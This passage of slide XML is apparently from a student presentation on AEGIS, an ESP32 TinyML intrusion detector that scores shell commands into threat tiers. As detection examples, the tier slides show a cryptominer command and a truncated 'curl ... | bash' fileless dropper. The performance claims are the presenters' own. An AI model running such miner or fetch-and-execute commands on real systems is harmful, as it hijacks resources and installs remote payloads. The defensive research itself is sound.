            </a:pPr>
            <a:r>
              <a:t>• ZERO DYNAMIC ALLOCATIONS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Strict compile-time static allocations (0 bytes malloc/free). Eliminates memory leaks and heap fragmentation entirely.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• TOTAL SRAM UTILIZATION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Consumes only 53,640 bytes (10.3%) of ESP32's 520 KB SRAM. Leaves 89.7% of memory free for future expansions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• STATIC BUFFER BREAKDOWN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• UART Ring Buffer: 2,048 Bytes</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Replay Buffer: 1,536 Bytes</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Vector Scratchpad: 1,024 Bytes</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• Model Weights: 512 Bytes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• 72-HOUR STRESS TESTING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Heap tracking via esp_get_free_heap_size() verified exactly 0 bytes of drift across 3 days of continuous exploit stress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 Telemetry &amp; Multi-Tier Exploit Neutralization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CC71"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>TIER 0: SAFE (Score 0-30)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Command: `ls -la /home/user &amp;&amp; git status`</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Entropy: 1.85 bits/char | Threat Score: S = 12</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UI: Green 'SAFE' banner | Buzzer: Muted | Strobe: Dim Heartbeat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9C12"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>TIER 1: SUSPICIOUS (Score 30-60)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Command: `python3 inline_script_exemption`</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Entropy: 3.39 bits/char | Threat Score: S = 18</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UI: Yellow 'SAFE VIA EXEMPTION' | Buzzer: Single chirp | Strobe: 1 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Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>TIER 2: MALICIOUS (Score 60-85)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Command: `xmrig --url stratum+tcp://... -u 44AFF...`</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Entropy: 4.21 bits/char | Threat Score: S = 78</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UI: Red 'MALICIOUS MINER' | Buzzer: Dual 2.8kHz beeps | Strobe: 5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0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0064"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>TIER 3: CRITICAL (Score 85-100)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Command: `memfd_create dropper &amp;&amp; curl ... | bash`</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Entropy: 4.85 bits/char | Threat Score: S = 96</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>UI: Inverted Flashing 'ATTACK BLOCKED' | Buzzer: Continuous warble siren | Strobe: 10 Hz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Comparative Analysis vs State-of-the-Art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645920"/>
                <a:gridCol w="1645920"/>
                <a:gridCol w="1645920"/>
                <a:gridCol w="1645920"/>
              </a:tblGrid>
              <a:tr h="762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Compute Core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Continual SGD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Heap Alloc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Cloud SIEM (Splunk)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AWS Server Cluster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150ms – 4.5s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Cloud Batch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Gigabytes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High ($$$/mo)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Host EDR (Wazuh)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Host CPU (x86_64)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10ms – 50ms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Ruleset Update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Megabytes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License Fee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EdgeEye (Ray et al.)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ARM Cortex-M4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450 µs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None (Static)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Dynamic (~12KB)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$15 – $25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0C9FF"/>
                          </a:solidFill>
                          <a:latin typeface="Segoe UI"/>
                        </a:defRPr>
                      </a:pPr>
                      <a:r>
                        <a:t>TinyIDS (Al-Hawawreh)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Raspberry Pi 4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Dynamic (Python)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EBF0F5"/>
                          </a:solidFill>
                          <a:latin typeface="Segoe UI"/>
                        </a:defRPr>
                      </a:pPr>
                      <a:r>
                        <a:t>$45 – $75</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="141C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AEGIS Sentinel (Ours)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="1E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ESP32 (240 MHz)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="1E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&lt; 45 µs (1.25µs Tree)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="1E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On-Device SGD</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="1E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0 Bytes (Static)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="1E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CC71"/>
                          </a:solidFill>
                          <a:latin typeface="Segoe UI"/>
                        </a:defRPr>
                      </a:pPr>
                      <a:r>
                        <a:t>&lt; $10 USD</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr>
                    <a:solidFill>
                      <a:srgbClr val="1E2D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Innovations &amp; Engineering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1. AIR-GAPPED HARDWARE SECURITY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Physical decoupling onto a dedicated microcontroller eliminates host-side kernel compromise, rootkit blinding, and CPU context switching jitter.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2. PRE-EXECUTION ULTRA-LOW LATENCY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Sub-45 microsecond inference completes before malicious shellcode can map into virtual memory, enabling true real-time exploit prevention.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3. FIRST ON-DEVICE CONTINUAL LEARNING IDS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Demonstrates that resource-constrained microcontrollers (Xtensa 240 MHz) can execute Momentum SGD locally in 38.4 µs without catastrophic forgetting.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4. PROVABLE ZERO-HEAP STABILITY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Zero dynamic memory allocations (0 bytes malloc/free) eliminate runtime heap crashes, ensuring 24/7 mission-critical industrial reliability.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5. FLASH PERSISTENT HYPERPLANE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Integrates ESP-IDF NVS flash serialization, guaranteeing learned threat adaptations survive power failures and field reboots.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9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>6. DEMOCRATIZED EDGE ECONOMICS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1000">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Industrial-grade cyber defense implemented on an open-source, commercially accessible platform for under $10 USD.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Engineering Scope &amp; Research Extensions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C9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>DIRECT eBPF KERNEL TRACING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="8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Transition from user-space /proc monitor to in-kernel extended Berkeley Packet Filter (eBPF) probes for synchronous system call interception.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39C12"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>HIGH-SPEED SPI DMA BUS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="8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Upgrade UART (115.2 kbps) to a 40 Mbps SPI DMA interface, reducing serial transmission latency to under 2 microseconds.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ECC71"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>HARDWARE CRYPTOGRAPHIC AUTH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="8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Add a dedicated secure element (ATECC608A) for hardware AES-256 GCM encryption and anti-tamper telemetry frame signing.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48CAE4"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>FEDERATED CONTINUAL LEARNING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Equip sentinel fleet with ESP-NOW mesh networking to aggregate weight updates across distributed industrial endpoints without sharing raw logs.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C9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>AEGIS TINYML SENTINEL | SRM VALLIAMMAI COLLEGE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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References &amp; Acknowledgements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40080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9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>KEY SCHOLARLY REFERENCES</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[1] X. Zhang et al., 'End-to-End Latency Benchmarking of Cloud-Offloaded Telemetry in Industrial IoT,' IEEE Trans. Ind. Inform., 2022.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[2] P. Warden &amp; D. Situnayake, TinyML: Machine Learning on Arduino and Ultra-Low-Power Microcontrollers. O'Reilly Media, 2019.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[3] R. Kumar &amp; N. Varma, 'Kernel Rootkits and the Vulnerability of Host-Based Intrusion Detection,' ACM Comput. Surv., 2021.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[4] J. Lin et al., 'On-Device Training Under 256KB Memory,' NeurIPS, 2022.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>[5] L. Pellegrini et al., 'Latent Replay for Real-Time Continual Learning on Edge Devices,' IEEE CVPR Workshops, 2020.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645920"/>
            <a:ext cx="402336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t>ACKNOWLEDGEMENTS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1050">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• SRM VALLIAMMAI ENGINEERING COLLEGE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Special thanks to the evaluators, faculty, and symposium organizers for providing the platform to present this research.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1050">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• CHENNAI INSTITUTE OF TECHNOLOGY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Shri. P. Sriram (Chairman) and Dr. A. Ramesh (Principal) for state-of-the-art laboratory facilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1050">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• DEPARTMENT OF ECE, CIT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="950">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Dr. T. S. Arulananth (HOD) and Mr. Baskar M.E. (Project Supervisor) for invaluable technical mentorship and direction.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C9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AEGIS: TINYML EMBEDDED KERNEL SENTINEL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="48CAE4"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Sub-45 µs Real-Time Inference | 0 Bytes Dynamic Heap | On-Chip Continual Learning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="1C2541"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━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39C12"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>QUESTIONS &amp; DISCUSSION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Presenters: Sai Prasath P (210425106193) &amp; Tamil Selvan J (210425106242)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Chennai Institute of Technology (Autonomous)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Presented at SRM Valliammai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